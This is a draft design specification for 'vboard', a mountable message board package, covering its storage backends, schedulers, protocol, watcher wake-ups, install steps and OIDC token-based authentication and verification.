# vboard: v1 spec (draft)

A message board you mount in one route. It has one durable log, verified
authors, channels and threads, a live tail, and optional two-way sync with Slack,
GitHub, and WhatsApp (through Kapso). The npm package `vboard` ships the board
(`board()`, whose handle serves it and acts on it), its backends, and the CLI.
The API sits under the handle, and the handle sits under the CLI.

```ts
// app/api/board/[[...path]]/route.ts
import { board } from 'vboard'
import { a2 } from 'vboard/backend-a2'
import { postgres } from 'vboard/backend-a2/store-postgres' // or store-redis, store-redis-http, store-sqlite

const team = board({
  backend: a2({
    store: postgres({ connectionString: process.env.DATABASE_URL! }),
  }),
})
export const GET = team.fetch, POST = team.fetch
```

`store` is where the board keeps its log and its tables: `postgres()`,
`redis()`, `redisHttp()`, `sqlite()`, or `memory()`, each from
`vboard/backend-a2/store-*` (see [Reading state](#reading-state)). Without
one it's SQLite in a file, `.a2/dev.db` under the working directory, in every
environment: that suits development and a single long-running server. A
serverless function's filesystem (Vercel's) is read-only outside `/tmp`, so
there each of the board's requests answers 500 `no_store` (`can't open SQLite
at .a2/dev.db: this filesystem isn't writable here, so pass a store to a2()`)
until you pass a store. Pointing `sqlite({ path })` at `/tmp` would keep a
separate, throwaway board per instance, so don't. Tests pass `memory()`.
Nothing else in `a2()` comes from the environment.

`scheduler` and `blob` are optional. A `scheduler` gives the board a clock:
`vercelQueues()` from `vboard/backend-a2/scheduler-vercel` or `qstash()` from
`…/scheduler-qstash` on serverless functions, or `localScheduler()` from
`…/scheduler-local` in a long-running process. Without one, the board's
consumers run in the request that wrote, and scheduling answers 501
`no_scheduler` (see [Backends](#backends)): fine for a tool, not enough for a
production board with watchers or sync. `blob` is where
[attachments](#attachments) live: `vercelBlob()` from
`vboard/backend-a2/blob-vercel`, on a private Vercel Blob store connected to the
project, or `fsBlob()` and `memoryBlob()` from `vboard/backend-a2`. Without one
the board keeps no files, and the rest of it works.

```ts
import { board } from 'vboard'
import { a2 } from 'vboard/backend-a2'
import { postgres } from 'vboard/backend-a2/store-postgres'
import { vercelQueues } from 'vboard/backend-a2/scheduler-vercel'
import { vercelBlob } from 'vboard/backend-a2/blob-vercel'

const backend = a2({
  store: postgres({ connectionString: process.env.DATABASE_URL! }),
  scheduler: vercelQueues(),
  blob: vercelBlob(),
})
const team = board({ backend })
export const GET = team.fetch, POST = team.fetch
export const { scheduler } = backend // mounted as POST in a route of its own
```

```bash
export VBOARD_URL=https://www.example.com/api/board
vboard post errors-www "deploy failed on a1b2c3"
```

## The model

1. **A board is one log**, mounted in one route of one Vercel project. To get a
   second board, mount a second route.
2. **Every request carries an OIDC token** (by default: a host's
   `authenticate` can take its own credentials). People get theirs from their
   `vercel login`, and machines get theirs from their platform. The board
   trusts its own project's people and its deployments in the environment the
   board runs in, plus whatever `access` lists, and `access` says what each may do in each channel.
3. **Every event records who wrote it**: a verified principal, plus an
   optional profile, such as an agent acting for a person.
4. **A thread syncs with a set of external threads.** A message written in the
   thread, wherever it was written, is delivered to every one of those external
   threads except the one it came from.
5. **Sync is configured per platform, keyed by the platform's own things.**
   Slack sync is keyed by Slack channels, GitHub sync by repos, and WhatsApp
   sync by phone numbers. A key maps either to a board channel, which makes a
   two-way mirror, or to a function, which handles inbound events however you
   like.

## Principles

- **Access is per channel, and code says it.** `board({ access })` says what
  each kind of principal may do in each channel: `read`, `post`, `react`,
  `label`, `sync`, or `manage`. Reads are gated, so a write-only caller is
  `['post']`, and what a caller can't read answers 404. Nothing is minted or
  stored: a credential lives as long as its OIDC token. The board has no roles
  or member list, and nothing restricts the project's own people, so content
  that needs privacy from them still needs a second board.
- **No accounts.** The board has no login page, sessions, or user table.
  Principals are strings derived from verified OIDC claims, from verified
  platform webhooks, or from a host's own `authenticate`.
- **Provenance is server-authored.** The `by`, `mentions`, `origin`, and
  sync receipt fields are never taken from the request body. This is the same
  rule as Just Chat's trusted message metadata.
- **Wiring is code; the log holds facts.** Sync mappings, callbacks, watchers,
  and access live in `board()` and its backend's config, where they're reviewed and deployed.
  They're never stored as data in the log. Who sees a fact is decided when it's
  read: folds stay global, and filters are per reader. On `a2()`, log indexes
  still show how busy the board is.
- **Everything is legible in plain text.** Actor IDs are readable strings, not
  hashes. A message ID is also a cursor, and on `a2()` both are plain
  decimals. The CLI is a product constraint, not a lesser frontend.
- **The log is the only source of truth.** Messages are read from tables the
  `vboard-tables` consumer keeps from it, with the same folds, and smaller views
  are A2 reducers. Both are derived: the tables fill from the log on their own,
  and reducer snapshots are caches, safe to delete. There's no second data
  model.
- **The board log holds facts people read.** It's one log, deliberately, because
  that gives one global order, reducers that see everything, and atomic
  batches. Keeping it lean is our side of the bargain: bookkeeping lives in side
  contracts (raw platform events, watcher matches, schedules), and scaling one
  log to millions of events is A2's job.
- **One store, and a scheduler if you pass one.** On `a2()`, everything the
  board persists goes through its `store`, except files, which go to its
  `blob` store. Every background job goes through its `scheduler`, or runs in
  the request that wrote when there's none. Sync needs no state store of its
  own.
- **One handle.** The CLI, your scripts, watchers, and sync callbacks all act
  through a handle from `board()`. Only the backend and who it acts as differ.
- **Fan-out is not a read path.** Consumers exist only to keep the tables and
  to work with external systems: running inbound mappings, delivering outbound
  messages, and running watchers. Inbox-style views are queries.

## Package layout

One package, `vboard`, with subpath exports:

| Import | Contents | Runtime |
| --- | --- | --- |
| `vboard` | `board()`, the handle on a board, with its types; the `Backend` and `Protocol` types, `HttpError`, watchers, and middleware. The `node` build also finds the board and a token (see [The handle](#the-handle)) | isomorphic |
| `vboard/access` | Who may use a board: `oidcTokens()`, `board()`'s default `authenticate`; the rules `vercelProject()`, `githubActions()`, and `oidc()`; and the permission types | server |
| `vboard/backend-a2` | `a2()`, a board kept in this deployment on A2's log, and its blob stores | server |
| `vboard/backend-a2/store-postgres`, `…/store-redis`, `…/store-redis-http`, `…/store-sqlite`, `…/store-memory` | Where `a2()` keeps its log and its tables | server |
| `vboard/backend-a2/scheduler-vercel`, `…/scheduler-qstash` | `vercelQueues()` and `qstash()`: what runs `a2()`'s consumers and timers on serverless functions | server |
| `vboard/backend-a2/scheduler-local` | `localScheduler()`, a scheduler whose timers live in the process: for development, `vb serve`, tests, and long-running servers, never serverless functions (a restart drops what's pending) | server |
| `vboard/backend-a2/blob-vercel` | `vercelBlob()`, attachments in a private Vercel Blob store | server |
| `vboard/backend-a2/contract` | The board log's A2 contract, its entity schemas, and the reducers for messages, channels, and actors | isomorphic |
| `vboard/backend-http` | `http()`, a board that uses another one over its protocol. The `node` build also finds the board and a token | isomorphic |
| `vboard/conformance` | `conformance()`, which checks that a board speaks the protocol | isomorphic |
| `vboard/sync-slack` | `slack()`, the Slack sync adapter | server |
| `vboard/sync-github` | `github()`, the GitHub sync adapter | server |
| `vboard/sync-kapso` | `kapso()`, the WhatsApp sync adapter, for Kapso's Chat SDK adapter | server |
| `vboard/sync` | Shared event schemas, `SyncProvider`, the callback client's type (`SyncClient`), and `withUserTokens()` and `connectUserTokens()` | server |
| `vboard/sync/chat` | `ChatSyncProvider`, for a sync provider of your own on a Chat SDK adapter | server |
| bins `vboard`, `vb` | The CLI, built only on `board()`. `vb` is a short alias | Node ≥ 22.18 |

A backend's own pieces live under its path, and everything that works with any
backend lives at the top. Sync adapters are named for the Chat SDK adapter they
take: `sync-kapso` takes `@kapso/chat-adapter`, which leaves `sync-whatsapp` for
`@chat-adapter/whatsapp`, Meta's own, whose threads are contacts rather than
conversations.

### Backends

`board({ backend, authenticate, access, middleware, project, watch, sync, url,
basePath, streamMaxMs })` mounts a board on a backend, which says where the
board lives. `board()` owns the HTTP and the policy on every backend: it routes
each request, validates it with the schemas in `src/api/routes.ts`, checks the
shape of its `x-board-*` claims, verifies its caller with `authenticate`
(`oidcTokens()` from `vboard/access` by default), works out the actor (the
principal plus its claimed profile, `vercel:user:u_123+claude`), applies
`access`, runs the [middleware](#middleware), maps errors, and serves
`/avatars/:name`, `/openapi.json`, discovery, and SSE. It calls the backend's
method of the same name as the route with the caller it verified. Nothing with
side effects runs for a request before `access` allows it: it resolves a sync
target on a platform (which can join a Slack channel), looks up an email,
records who that is, reads an upload, or runs the middleware only for a caller
that may (`post`, and `sync` for targets, where the write lands). A request it
may not goes to the backend as it came, which refuses it. It keeps verified
token principals by credential until they expire, and each request's principal
for the request's life, and works out what a stream's caller may do again for
each page. What it returns is [the handle](#the-handle), whose `fetch` is that
one handler (`export const GET = team.fetch, POST = team.fetch`). TypeScript
rejects an option on the call it doesn't belong to; nothing checks at runtime.

- **A backend is a plain object** (`Backend` in `src/server/backend.ts`): one
  async method per protocol method (`Protocol` in `src/api/protocol.ts`), each
  `(caller, input, signal)`, plus `routes`, `keeps`, and `bind`. `board()`
  only ever calls these: it verifies and decides, and the backend stores,
  honoring what each caller may do. `typing` and `readSource` are methods too,
  and so is `discovery`, which a handle asks: a request's discovery is
  `board()`'s, the URL it reached and the project tokens are minted for, with
  the sync entries a backend that keeps the board lists. `input` is what the route's schema parsed; the output is what the route
  answers, 201 for `post`, `schedule`, and `upload`. `attachment` answers the
  file's record and bytes, and `board()` serves them with the headers that keep
  a file from running as a page. A method throws `HttpError` for a status and
  code of its own.
- **A caller** is `{ identity, origin }`, one `board()` verified:
  `identity.principal` (who it is, with its `access`, narrowed by the `scope`
  it sent), `identity.author` (the author record its writes carry), and
  `identity.actor` (the actor it writes as). It's a request's
  (`origin.via.kind` is `api`), or for work a backend does outside requests,
  the one it's done for: a schedule's creator at its send (`schedule`). A
  backend trusts it as it is, since only `board()` makes one, in process, and
  every method honors its access. Or `{ self, origin }`, this deployment's own
  code: the handle (`origin.via.kind` is `client`, and `self` the profile from
  `as()`, or null), a watcher (`watcher`), the middleware's handle
  (`middleware`), or sync (`engine`); who `self` is on its board, each backend
  says. Claims are labels under the verified principal, never security.
  `origin` is in-process only: board() sets `config` (the targets a new root's
  channel syncs with), and no request carries it.
- **`routes`** are a backend's own, beside the protocol. `board()` verifies
  nothing for them: a request's `caller` is null, and the route checks what it
  needs. One at a protocol route's path takes its place.
- **`keeps`** says whether the board lives in the backend. One that keeps it
  (`a2()`) takes `board()`'s defaults when `access` is left out (people, and
  the board's own deployments in its environment); one that doesn't
  (`http()`) serves no request then but wake-ups and webhooks, and verifies
  none.
- **`bind(binding)`** is called once, when `board()` is created, before any
  request, and does no I/O. It's what background work needs from the board:
  `subscriptions` (each watcher's tail, and sync's at `@sync`, which gets every
  post, change, and thread sync) with `run(id, event, { trigger, attempt })`;
  sync's inbound, `receive(key, event, { id, attempt })` for a backend that
  delivers what sync pushed in-process, and `pull()` for one that queues it;
  `sync` (board()'s sync entries); `readSource(key, target, limit)` and
  `typing(messages, status)`, what only board()'s sync can do, which a backend
  answers those methods through; `accessNow(principal)`, board()'s policy for
  a principal the backend stored (a schedule's creator at each send, a
  registrant at each event and pull, the syncs that link accounts), null once
  it may do nothing; `project()`, the board's Vercel project; `handle(caller)`,
  a handle through board(), as a verified caller (a schedule's creator, whose
  posts keep their IDs) or its own code, so what a backend writes for someone
  goes through the middleware; and `url()`, the board's own URL once it's
  known.
- **Sync runs in `board()`,** on every backend (see [Sync](#sync)). Sync's
  adapters, webhooks (`/webhooks/:key`, no token), `/messages/:id/sync`,
  `/identity/sign-in` and `/signed-in` (no token), and `/identity/unlink` are
  `board()`'s routes; sync reads and writes only through the protocol, as its
  own caller. `readSource` and `typing` are protocol methods: a2() answers
  them through the binding, so they work from the CLI against the board that
  runs the sync, and a board that runs no such entry answers 404
  `not_synced_here` for a source read.
- **SSE is built from `events`,** the long-poll: `board()` loops it, sends each
  event with `id: <its cursor>`, and a bare `id:` when a page's cursor moved
  past its last event. It honors `Last-Event-ID` when `after` is absent, pings
  every 15 seconds, and closes at `streamMaxMs`.

The backends vboard ships:

- **`a2({ store?, scheduler?, blob? })`** keeps the board in this deployment, on
  A2's log, and is the backend object itself: the log and its engine. It
  builds its A2 servers when `board()` binds it; a store connects when it's
  first used. Everything else in this spec describes it. Its one default is
  the store, SQLite at `.a2/dev.db` under the working directory, the same in
  every environment: it opens on the board's first call, and the servers are
  built then (its `servers`, `session`, and `store` throw before). A
  serverless function can't open it (500 `no_store` on each request, see the
  top of this spec). Nothing else comes from the environment
  (`transport`, its last option, is for tests: how it POSTs wake-ups). It
  trusts the callers
  `board()` verified, and what it does outside requests that needs the policy,
  it asks `board()` through the binding: each event's access for registered
  watchers, each pull's, a schedule's send-time re-check and revocation, and
  which registered syncs may still link accounts. A schedule's send goes
  through `board()`, as its creator, on the binding's handle, so the
  middleware sees it. A verified caller writes as its actor; `{ self }` writes as `vboard:client` from the handle,
  `vboard:client:<profile>` from `as(profile)`, `vboard:watch:<id>` from a
  watcher, `vboard:middleware` from the middleware's handle, and `vboard:sync`
  from sync. Its extras are `scheduler`
  (the scheduler's callback, for its own route: `export const { scheduler } =
  backend`), `servers`, and, for tests and tools, `session` and `store`. It
  has no routes of its own. Its dead letters are A2's, on its `servers`. It
  delivers sync's
  subscription in-process, on the `vboard-sync` consumer's thread lanes, and
  what sync pushes to its inbox on `vboard-inbox`'s platform-thread lanes, so
  both keep A2's retries and dead letters. It takes no `sync`, `authenticate`,
  `access`, `middleware`, or `project`: TypeScript flags them there.
  - **Without a `scheduler`,** nothing runs on a clock. The consumers (the
    tables, watchers, sync's delivery and inbox) still run, in the request
    that appended: one that fails is tried again on the next write to its
    session, a lease that runs out is noticed on the next pull, and a
    wake-up that didn't get there (and its back-off) waits for the next match.
    A read catches the tables up and wakes nothing else. That's fine for a
    tool, and not enough for a production board with watchers or sync.
    Scheduling refuses: `schedule`
    answers 501 `no_scheduler`, ``this board has no scheduler: pass
    `scheduler` to `a2()` to send later``, and the backend's `scheduler`
    callback answers 404 `this board has no scheduler`.
  - **Without a `blob` store,** the board keeps no files: `upload`, a post,
    schedule, or sync import that carries `attachments`, and `attachment`
    answer 501 `no_files`, ``this board keeps no files: pass `blob` to
    `a2()` ``. Sync brings a platform's files over as links instead, one line
    each (`📎 [shot.png](https://files.slack.com/…) (7 B) didn't come over:
    this board keeps no files`, or the name alone when the platform gave no
    URL), and sends none out.
- **`http(url?, { fetch? })`** uses the board at `url` (in Node, the one the
  environment points at by default), which keeps the log: its methods call it
  through `fetch`, which brings the credentials. In Node the default `fetch`
  adds what `vb` uses: a token from `VBOARD_TOKEN`, a local board's token
  file, GitHub Actions or Vercel OIDC, then `vercel login` (minting for the
  project the other board's host is a deployment of, and only when its
  discovery names the same), your handle, and the Deployment
  Protection handling; in a browser it's `fetch`, sending the page's own
  session, which the other board's `authenticate` recognizes. Its board's
  middleware runs on what it writes, and the other board's after. A `{ self }` caller
  writes there as this deployment with `self` as its profile (the handle's
  own with the profile `VBOARD_AS` or the agent picks), and a post whose ID
  `board()` derived (from a watcher's trigger, or from the handle's `id` and
  profile) gets `key:<principal>:<sha256 of that ID>`. Any board takes a
  `key:` ID only in exactly that shape from that principal (`key:`, its ID,
  `:`, and 32 hex characters, since one principal's ID can be the start of
  another's), so the same `id` never posts
  twice and no one can post with one first (and `posted`, a retry's lookup,
  asks for the same). Without an `access` on its board, it answers only
  wake-ups and webhooks, and its sync's sign-ins: a request, discovery
  included, answers 404 `<url> answers only wake-ups and webhooks`, and none is
  verified. Its `discovery` for its own handle reads the other board's. With
  one, its board is a gateway: it verifies and limits its own callers, and
  each acts on the other board as this deployment, never vouching for a
  person, with the caller's handle as its profile (`<principal>+ada`, a label,
  numbered `fix-2` when it's one of this board's watchers' IDs, since a
  watcher's own writes never wake it) and its access as `x-board-scope`, so
  the other board grants only what both allow. A caller's post IDs are under
  its own principal, `me` is answered here, and what's the project's own there
  by principal answers 403: `identity`, `edit`, `delete`, `schedule`,
  `cancelSchedule`, `upload` (a file is its uploader's, the project's there,
  to read and attach until a message carries it), the registration's methods,
  and sync's and the inbox's. `readSource` for one of its own sync's entries, and `typing` through
  its own sync, it answers here too, beside the other board's. Its own routes
  are `POST /wake` and `POST /watchers` (no token; a handle's `POST /watchers`
  registers its own there, as the protocol's does), and `registerWatchers()`
  registers this board's now. Its watchers run here, on what the other board matches for them
  (below), and so does its sync: it registers its sync entries (`sync: [{ key,
  platform, signIn }]`), pulls what to deliver as matches of watcher `@sync`,
  and pulls back what it pushed to its inbox after each webhook and when it's
  woken. Sync's own calls go as the deployment itself, which the other board
  must let `sync`, and wait for that registration. The other board lists the
  registered entries in its discovery and links accounts on them, while their
  registrant may still sync: a key its own sync has is its own (registering it
  is 409 `sync_key_taken`, and one registered before the board's own sync took
  it holds nothing under it), and a key two registered syncs claim signs no one
  in (a code still links by posting it). A key names its sync's platform
  locations, so each sync sees and changes only the copies it recorded
  (`importedBy` and `syncedBy` on its events), and two that claim one key share
  its platform threads on the board: give each key one sync. People and
  the CLI use the other board: a repo links it with `vb link`.

### IDs, cursors, and versions

The backend picks them; the protocol only says their shape:

- **Message IDs, schedule IDs, and cursors are opaque strings** of 1 to 128
  characters (`Ref` in `src/api/routes.ts`). Clients compare them for equality
  and pass them back as they got them; they never parse them, count with them,
  or order by them. Payload IDs in event views (`id`, `re`, `replyTo`, a
  schedule's `id`, a link's `message`) are strings too.
- **A message ID works as a cursor.** `after` and `before` take either; one the
  board can't read as a cursor answers 400 `invalid_cursor`. Every read reports
  `cursor`, and every event view carries its own `cursor` (SSE's `id:`).
- **Every message view has `version`,** a number that grows with each change to
  the message: of two views of one message, the higher `version` is newer.
- **On `a2()` they're decimal log indexes.** A message's ID is the index of
  its `message.posted` event (`"812"`), and a schedule's the index of its
  `schedule.created` event in session `schedules`. A cursor is the index a read
  reflects, or an event's own, and a version is the index of the last event
  that changed the message. The log and the tables keep numbers; only views are
  strings. The CLI shows them as `#812` and `s12`.

### The protocol and conformance

- **Every board answers the whole protocol:** discovery, `/me`, `/channels`,
  `/actors`, `/identity`, `/messages`, `/threads`, posting, editing, deleting,
  reacting, labeling, typing, source reads, schedules, attachments, registered
  watchers, sync's records, and `/events`. There are no optional groups, and
  discovery lists none. A board on `a2()` may keep no schedules or no files
  (no `scheduler`, no `blob`), and says so with a 501 (`no_scheduler`,
  `no_files`), which the kit reports as not kept here.
- **`vboard/conformance` checks a board through a handle,** `conformance(board())`, all of it, a group
  at a time in the report (`core`, `schedules`, `attachments`, `watchers`,
  `sync`). It writes to one channel, every post kept on the board and labeled
  with the run, and deletes what it posted. A check the board answers with a
  501 in `schedules` or `attachments` is `skipped`, with the detail `not kept
  here: <the board's message>`; one that would replace the caller's own
  registration is skipped too. `vb conformance` runs it as the CLI's identity
  and exits 1 when a check fails. vboard's own tests run it against `a2()`,
  against a board without a scheduler or blob store (which reports those two
  as not kept here), and against boards broken on purpose, so the kit and the
  backend can't drift apart unnoticed.

### Watchers over `http()`

The board that keeps the log matches the tails; the board on `http()` runs
`run`. Nothing is pushed but a wake-up with nothing in it:

| Route, on the board with the log | What |
| --- | --- |
| `POST /watchers` | `{ url?, watch, sync? }`: registers the caller's watchers and sync entries, replacing its last registration. Needs `read` somewhere, and `sync` somewhere for sync entries; at most 32 watchers; `url` must be `https`, and without one the caller pulls on its own |
| `GET /watchers` | Every registration to `manage` in every channel, the caller's own to anyone else |
| `GET /watchers/matches?limit&wait` | What the caller can run now, each leased to it for 5 minutes. `wait` holds the request up to 25 seconds for one |
| `POST /watchers/matches/:id/ack` | `{ lease, error?, skip? }`: done, an error to try again, or a skip |

| Route, on the board on `http()` | What |
| --- | --- |
| `POST /watchers` | Registers its own watchers with the other board, now. No body, no token |
| `POST /wake` | Something matched. It registers again if `x-board-watchers` isn't its own hash, then pulls, runs, and acks until nothing's left |

- **Registrations** live in `vboard-registry`, session `registry`, one per
  principal with its token facts, so its access is worked out again at each
  match under the rules as they are then. A board on `http()` registers on
  its first use (a method call or one of its routes) if it knows its URL, on
  `POST /watchers`, and on a wake-up with a stale hash; creating it does no
  I/O. Its URL is `board()`'s `url()`: `url`, or on Vercel its production
  domain (a preview's own URL there) under the mount path a request showed,
  never a request's `Host`.
- **Matching** is `vboard-watchers`, as for config watchers. A registered
  watcher sees what its registrant may read, as `/events` shows it, and its
  writes (`<principal>+<id>`) never wake it. One event's matches for one
  registrant are one append, to `watch:@<principal>` in `vboard-watch`.
- **The queue** is a reducer over that session: one queue per watcher and
  thread, of which only the oldest is handed out, so a thread's matches run in
  order. Pulling leases it (`watch.leased`, an ID derived from the match and
  its try, so two pulls at once lease it once); acking ends it
  (`watch.acked`). What one pull changes is one append, and one read after it
  tells which leases are its own. An error waits 1 second, doubling to 30, by
  its own A2 timer (`watch.due`). A lease that runs out (`watch.expired`)
  counts as a try. After 5 tries it's `watch.failed`, and the thread goes on.
  A pull drops what the registrant can't read anymore (`watch.skipped`).
- **Sweeps** stand in for a timer per lease: a registrant has at most one A2
  timer a minute (`watch.armed`, then `watch.due` with `sweep`), set on the
  minute after a pull's leases run out, or after a wake-up that didn't get
  there. A sweep wakes the registrant if anything is free to pull: a lease
  whose time has passed counts, and the pull records it.
- **Wake-ups** go to `<url>/wake` from `vboard-wake`, one at a time per
  registrant (its lane is `wake` in the registrant's session), and only when
  something is free to pull. The board woken pulls until nothing's left, so a
  burst of matches wakes it once. `https` to a public address only, checked as
  it connects, with no redirects and no event; the board woken trusts nothing
  in it. A run that keeps throwing (the store is down) stops after three
  tries and leaves the wake-up to the next match or sweep, so the lane never
  dead-letters.
- **A wake-up that doesn't get there** (an error, or an answer that isn't
  2xx) is `watch.unreachable` in the registrant's session, with how many
  failed in a row and when the next may go: a minute, doubling to an hour
  (`wakeBackoff`). Until then a match only queues, and the sweep armed for
  that time wakes it. `watch.reachable` ends the wait: a wake-up that gets
  there, a pull, or a registration (`POST /watchers`, changed or not, since a
  new deployment registers on its first use). The board logs the first
  failure and the second, when the back-off starts, and not the rest.
- **Through Deployment Protection:** a wake-up carries no credential, ever:
  no OIDC token and no `VERCEL_AUTOMATION_BYPASS_SECRET`. A registrant behind
  Deployment Protection lets `POST /wake` through itself (a public
  production domain, or a Deployment Protection Exception for the domain it
  registers). Credentials sent with wake-ups would go to whatever URL a
  registrant chose, and Trusted Sources checks no audience on a Vercel
  project's entry, so the board sends none. Waking projects through their
  protection is the platform's to do, the way Connect forwards webhooks.
- **A board that can't be woken** (no `https` URL, as on a dev server)
  registers with no `url` and pulls on its own from its first use, each pull
  held open until something matches. One on Vercel registers its deployment's
  URL and never pulls on its own, since a function doesn't outlive its
  request: behind Deployment Protection, its wake-ups get through only where
  its project lets `POST /wake` through (a public production domain, or a
  Deployment Protection Exception).
- **On a board with no scheduler** (`a2()` without one), none of these timers
  run: an error's wait and a lease that runs out end at the next pull, sweeps
  never arm, and a wake-up that didn't get there waits for the next match
  after its back-off.

### Install

```bash
pnpm i vboard pg                                      # a board: log, tables, API, handle, CLI (or ioredis)
pnpm i @chat-adapter/slack @chat-adapter/github       # + your own Slack or GitHub adapter, instead of Connect
pnpm i chat @kapso/chat-adapter @kapso/whatsapp-cloud-api  # + sync with WhatsApp, through Kapso
```

Only `vboard` is needed to run the CLI against an existing board, e.g. with
`npx vboard`.

**Dependencies:**

- **Regular dependency: `experimental-a2`.** vboard owns it: you import your
  store and scheduler from vboard (`vboard/backend-a2/store-postgres`,
  `vboard/backend-a2/scheduler-vercel`), so they're always the copy vboard uses.
- **Peers, optional: `pg`, `ioredis`, `@vercel/queue`, `@upstash/qstash`,
  `@vercel/blob`.** Loaded only by `vboard/backend-a2/store-postgres`,
  `vboard/backend-a2/store-redis`, `vboard/backend-a2/scheduler-vercel`,
  `vboard/backend-a2/scheduler-qstash`, and `vboard/backend-a2/blob-vercel`.
  `vboard/backend-a2/store-redis-http` needs none: it speaks Upstash's REST API.
  `vboard/backend-a2/store-sqlite` uses Node's own `node:sqlite`.
- **Regular dependencies for sync: `chat`, `@chat-adapter/slack`,
  `@chat-adapter/github`, `@vercel/connect`.** `vboard/sync-slack` and
  `vboard/sync-github` build their adapters with them, from Connect or from
  secrets. `vboard/sync-kapso` takes an adapter you install
  (`@kapso/chat-adapter`). Your own adapters must match the `chat` version
  that vboard builds its Chat instances with. You don't install a Chat SDK
  state adapter: sync's correctness comes from the board log, and its Chat
  instances keep only best-effort caches in memory.
- **Regular dependencies:** `zod` (v4), `jose` for JWT and JWKS verification,
  and `@vercel/oidc` for client-side token minting.

## API technology (decision)

- **Zod v4 schemas are the single source.** A route table of
  `{ method, path, query, body, response }` drives server validation, the
  typed client (types are inferred, with no codegen), and `GET /openapi.json`
  via `z.toJSONSchema`.
- **The router is hand-rolled over the Fetch API.** It is about 100 lines with
  no framework. The handle's `fetch` is the handler, so it runs in a Next.js
  route, a Vercel function, or any fetch runtime. A2 already speaks Standard Schema,
  so the contract and the API share validators.
- **Only GET and POST are used.** The mount is always
  `export const GET = team.fetch, POST = team.fetch`, and every mutation is a
  POST to a resource path.
- **A2's `server.fetch` is never exposed.** All writes go through the board API
  so that `by` and the other provenance fields stay server-authored.

The alternative is oRPC, which provides OpenAPI and a typed client over Standard
Schema. It is reasonable if we'd rather not own the router, but the surface is
small enough that owning it keeps the dependency tree and the wire format
simple.

## Identity and auth

### Tokens

Every request sends `Authorization: Bearer <OIDC JWT>`. **Every token's `aud`
is the board's URL** (`https://www.example.com/api/board`, as returned by
discovery), so a token sent to one board can't be replayed anywhere else. That
includes another board mounted on the same origin. The one exception is `/webhooks/:name`, which is authenticated
by the platform adapter (see [Sync](#sync)).

In Node, a handle finds a token in this order, and the first match wins.
Other runtimes bring credentials in `http(url, { fetch })` (see [The handle](#the-handle)).

| Where | How | Principal |
| --- | --- | --- |
| Explicit | `VBOARD_TOKEN` (any OIDC JWT; for other CI systems and tests) | depends on the issuer |
| A local board (`vb serve`) | the token file it writes for its URL, only for loopback URLs | `local:user:<os user>` |
| GitHub Actions | `ACTIONS_ID_TOKEN_REQUEST_URL`, with audience set to the board URL (needs `permissions: id-token: write`) | `github:repo:<repository_id>` |
| A Vercel deployment | `@vercel/oidc` `getVercelOidcToken({ audience })` | `vercel:project:<project_id>:<env>` |
| A local terminal | your Vercel CLI login mints a development token for the project the board's host is a deployment of, then an exchange for the board's audience | `vercel:user:<user_id>` |

- **Local minting uses the Vercel CLI login.** With the CLI's credentials
  (`getVercelToken`) the client calls `api.vercel.com/v1/projects/<id>/token`,
  or `vercel project token <id>` when they're in the keyring, and caches the
  result. Vercel only mints this token for accounts that can access the
  project, so **access to the board equals access to its Vercel project**.
- **The `user_id` claim identifies the person.** On development tokens it holds
  the ID of the user the token was issued to. It exists only on development
  tokens, and that's exactly the case we use it for.
- **Discovery:** `GET /` is unauthenticated and returns
  `{ version, url, audience, team_id, project_id, sync }`, so the client knows
  which project to mint for. The CLI can run from any directory. Discovery is unauthenticated,
  so the client never takes its audience from it: every token's audience is the
  URL the client sends it to. When discovery's `audience` differs, the client
  mints and sends nothing and fails with `wrong_audience`, naming the board's
  URL. Otherwise a board could claim another board's audience and project, and
  replay the token it's sent there.
- **Nor its project.** Any board can name any project the person can access,
  and Deployment Protection's Trusted Sources ignore `aud`, so a development
  token for that project could be replayed past the protection of deployments
  that trust it. Before minting, the client asks Vercel with the person's login
  which project the board URL's host is a deployment of (`findProject`, as for
  the bypass below: `/v13/deployments/<host>`, which resolves deployment URLs,
  branch aliases, and domains, then `/now/aliases/<host>`, in their scope and
  then each team). It mints for that project and its owner, and only when it's
  the one discovery names: otherwise `wrong_project`, or `no_access` when
  Vercel finds nothing there for the person, and discovery's `team_id` plays no
  part. A loopback host has nothing to look up: a board there runs on the
  person's machine (`next dev`), so the client mints for the project and team
  it names.
- **Deployment protection:** hosted Vercel clients send their audience-bound
  OIDC token in `x-vercel-trusted-oidc-idp-token` for the edge and in
  `Authorization` for the board. Discovery uses `VBOARD_TOKEN` first,
  otherwise it mints an edge token with the configured board URL as audience. Local person clients do not add the trusted-OIDC
  header. Configure Deployment Protection Trusted
  Sources for the calling project and environment separately from the board's
  `access` rules. `VERCEL_AUTOMATION_BYPASS_SECRET` takes precedence, without
  requiring runtime OIDC for discovery. On Vercel it's a system variable holding
  the deployment's own project's secret, so a hosted client sends it only to the
  deployment's own hosts (`VERCEL_URL`, `VERCEL_BRANCH_URL`,
  `VERCEL_PROJECT_PRODUCTION_URL`) and falls back to OIDC when it's rejected.
  Every other board gets OIDC and never sees the secret. Otherwise, hosted
  clients fail with setup guidance when edge trust is missing and never read or
  create a saved bypass. Both OIDC headers are stripped on cross-origin redirects.
  A handle in Node sends an explicit secret in `x-vercel-protection-bypass`.
  For local people without that variable, when a board
  answers with Vercel Authentication's wall, it does what `vercel curl` does:
  with your Vercel login it resolves the board's host to its project
  (`/v13/deployments/<host>`, then `/now/aliases/<host>`, in your scope and then
  each team), reads its `automation-bypass` secret (creating one with
  `PATCH /v1/projects/<id>/protection-bypass` if there's none), caches it in
  `~/.config/vboard/bypass/`, and retries. When that can't work it fails with a
  `protected` error instead of parsing the login page.

**Verified (2026-10-01): the exchange keeps `user_id`.** We exchanged a
development token from `@vercel/oidc` 3.8.5 for a custom audience
(`oidc.vercel.com/~token`). The exchanged token:
- has `aud` set to the requested audience
- keeps the same `iss`, `sub`, `user_id`, and 12-hour lifetime
- adds an `act` claim recording the exchange

So the CLI never sends a token that's valid anywhere except the board it's
talking to.

### Server verification

- **Vercel tokens:**
  - Verify with `jose` against the team issuer's JWKS
    (`https://oidc.vercel.com/<team>`).
  - `aud` must be the board's URL.
  - The board knows its own project: `project_id` is compared to
    `VERCEL_PROJECT_ID`, `board({ project })`, or `.vercel/project.json` in local
    development.
  - A `development` token from it is a person and must carry `user_id`. Any
    other environment is the deployment itself. The one the board runs in
    (`VERCEL_TARGET_ENV`, else `VERCEL_ENV`) gets everything unless a rule
    matches it, and any other gets nothing unless one does: a production board
    refuses its previews, which run any branch's code, and a preview board
    accepts its own previews. Outside Vercel no environment is the board's, so
    only people get in without a rule.
